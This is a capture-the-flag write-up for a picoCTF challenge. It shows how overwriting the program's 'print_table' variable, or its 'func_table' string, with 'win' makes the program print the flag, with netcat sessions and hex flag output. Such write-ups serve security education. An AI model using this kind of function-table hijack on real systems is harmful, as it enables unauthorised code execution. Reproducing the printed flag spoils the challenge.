## Challenge information
```
Author: LT 'SYREAL' JONES

Description:
Can you figure out how this program works to get the flag?

Connect to the program with netcat:
$ nc saturn.picoctf.net <>
```

## Solution

This time we are given a more interactive version, we have a declared `func_table` with four options:
```python
  func_table = \

'''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''

USER_ALIVE = True
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32

def check_table():
  global func_table  
  if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
    return False
  return True
```

The `win` function:
```python
def win():
  # This line will not work locally unless you create your own 'flag.txt' in
  #   the same directory as this script
  flag = open('flag.txt', 'r').read()
  #flag = flag[:-1]
  flag = flag.strip()
  str_flag = ''
  for c in flag:
    str_flag += str(hex(ord(c))) + ' '
  print(str_flag)
```

The program let us create variables, modify their values, read them, it does not allow executing `win` or printing the `flag.txt `directly, like in previous one.

To execute `win` we have two options:

## Access `print_table` and overwrite it with `win` and then execute
```

┌──(kali㉿doubtful)-[~]
└─$ nc saturn.picoctf.net 60957
==> 1
1: print_table
2: read_variable
3: write_variable
4: getRandomNumber
==> 3
Please enter variable name to write: print_table
Please enter new value of variable: win
==> 1
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
```

## Modify `func_table` entries while maintaining the table size of 128 bytes (4 * 32)

```
──(kali㉿doubtful)-[~]
└─$ nc saturn.picoctf.net 49487
==> 3
Please enter variable name to write: func_table
Please enter new value of variable: func_table = '''print_table                     win                             write_variable                  print_table                     '''
==> 2
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 

```

## Decoding flag

The ouput can be decoded into correct flag using for example CyberChef's option FromHex.